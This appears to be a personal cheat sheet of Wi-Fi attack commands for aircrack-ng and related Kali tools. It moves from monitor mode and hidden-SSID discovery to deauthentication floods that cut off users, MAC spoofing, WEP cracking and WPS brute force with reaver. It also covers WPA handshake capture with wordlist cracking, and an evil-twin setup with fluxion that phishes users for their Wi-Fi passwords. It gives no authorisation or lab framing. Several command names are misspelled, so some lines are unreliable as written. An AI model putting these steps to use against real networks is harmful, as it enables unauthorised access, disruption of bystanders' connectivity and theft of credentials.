

 A-) first we should connect an alpha card and trun it to monitor mode, there is two ways to do that:
	1-) $iwconfig
	    $airmon-ng start wlan0
	
	2-) $iwconfig
	    $sudo ifconfig wlan0 down
	    $sudo iwconfig wlan0 mode monitor
	    $sudo ifconfig wlan0 up

now we can scan all nearby wifi with $airodump-ng wlan0
then choose the one that we want and write the following to see more information about the connected devices:
	airodump-ng wlan0 --bssid <target bssid>

however we might find some problems that make the airodump dont work, here are some ways to solve it:
$systemctl restart network.service
$airmon-ng then $sudo apt-get install firmware-<alpha card company name>
$airmon-ng check kill

 B-) extract the hidden wifi name:
	make the alpha card on the same channel of the wifi : 
		$iwconfig wlan0 channel <channel>
		$airodump-ng wlan0 --bssid <bssid>
	then to show the hidden name either i wait for some one to connect to the wifi (passive)
	or i disconnect anyone and he will reconnect again (active) and we do than as follow:
		$echo <someone mac> > blacklist.txt
		$mdk3 wlan0 blacklist.txt -c <channel>
	and boom the name was discovered

 C-) change the mac address,two ways:
	1-) the mac reset automaticly after restart:
		$sudo ifconfig wlan0 down
		$sudo ifconfig wlan0 hw ether 00:11:22:33:44:55
		$sudo ifconfig wlan0 up

	2-) the mac stay after restarting:
		$nano /etc/NetworkManager/networkmanager.conf
		then add the following:
			[device]
			wifi.scan-rand-mac-address=no

			[connection]
			ethernet.cloned-mac-address=preserve	
			wifi.cloned-mac-address=preserve
		and now repeat #1 method

 D-) there is wifi but there is no internet:
	1-) for all users:
		$aireplay-ng -a <bssid> --deauth 1000 wlan0
				                 ^^^^
			        	         number of packets  

	2-) for a spicific user:
		$airodump-ng --bssid <bssid> --channel <ch number> wlan0
		$aireplay-ng -a <bssid> -c <target mac> --deauth 1000 wlan0
	
 E-) attack WEP protected wifi, three ways:

	1-) open three terminal:
	    #in the first one we write:
		$airodump-ng wlan0 --bssid <bssid> -c <channel> -w /home/kali/wifi/wifi
	    we notice the DATA is rising too slow and we should make it reach 50 thousands
	    we can wait or we can make it rising faster.

	    #in the second one we write:
		$airepaly-ng --arpreplay -e <ESSID> wlan0 -h <any mac that is connected to the wifi>
	    we did that to make the wifi thinks that we are that person

	    #in the third one we write:
		$airreplay-ng --deauth 0 -e <ESSID> wlan0
	    to disconnect every one from wifi. we should stop it after a short while.
	    we notice the DATA is rising very fast. now we stop every thing and write:
		$aircrak-ng wifi-01.cap 
	    and boom we have the password.


	2-) open three terminals:
	    #in the first one we write:
		$airodump-ng wlan0 --bssid <bssid> -c <channel> -w /home/kali/wifi/wifi
	    we notice the DATA is rising too slow and we should make it reach 50 thousands
	    we can wait or we can make it rising faster.

	    #in the second one we write:
		$airepaly-ng --fakeauth 0 -a <bssid> -h <my mac address> wlan0
	    we did that to make us one of the connected users but in a fake way.

	    #in the third one we write:
		$airreplay-ng --arpreplay -b <bssid> -h <my mac address> wlan0
	    we notice the DATA is rising very fast. now we stop every thing and write:
		$aircrak-ng wifi-01.cap 
	    and boom we have the password.
	    

	3-) automated attack with tool called "wifite"
	    its so simple to use .it enables monitor mode and scan the nearby wifi automaticly.
	    we can easly press ctrl+c and select any wifi we interested in and attack it with fake auth attack
	    we again can press ctrl+c and choose any other attack we want

 F-) attack WPA/WPA2 protected wifi through wps feature:
	we write the following command to show all the wifi networks with wps feauture:
		$wash -i wlan0
	then we make a fake auth:
		$airepaly-ng --fakeauth 20 -a <bssid> -h <my mac address> wlan0
	and at the same time we will write the following command:
		$reaver -b <bssid> -c <channel> -i wlan0 -vvv -A
	and after some time we should get the key.
	it will not work if PBC option is on.

 G-) attack WPA/WPA2 protected wifi password using wordlist:
	first we need to capture the handshake, so we write:
		$airodump-ng wlan0 -c <channel> --bssid <bssid> -w /home/kali/wifi/handshake
	then either we wait for somone to connect or disconnect a user and make him reconnect like that:
		$airreplay-ng --deauth 5 -a <bssid> -c <someone mac address> wlan0
	now we have the handshake but we wait until beacons reach at least a thousand then we call it down.
	to ensure that the output file is good to crack we can upload it to website : GPUHASH.me
	now we can crack the password with a wordlist like that:
		$aircrack-ng -w rockyou.txt /home/kali/wifi/file.cap  
 
 H-) attack WPA/WPA2 protected wifi password using fulxion:
	$git clone https://github.com/wi-fi-analyzer/fluxion.git
	$/home/kali/fluxion/install/install.sh
	$/home/kali/fluxion/fluxion.sh
     this tool will disconnect all the users from the wifi 
     then get the handshake and create the SSL certification
     then make a web page
     then make a fake access point with the same name
     then make the user connect to it
     then when the user try open any website he well promopted to type the wifi password to continue
     then the tool get it and show it to us


 I-) make a fake access point with the same name:
	$airbase-ng wlan0
     then in another tap we write:
	$ifconfig -a
	$ifconfig at0 up
     now we have our fake wifi and we can configure it anyway we want
	$airbase-ng wlan0 -e <FakeAP Name> -a <fakeAP mac> -v
     if we open airodump-ng we notice that the beacons is rising very fast and the channel isn't stable
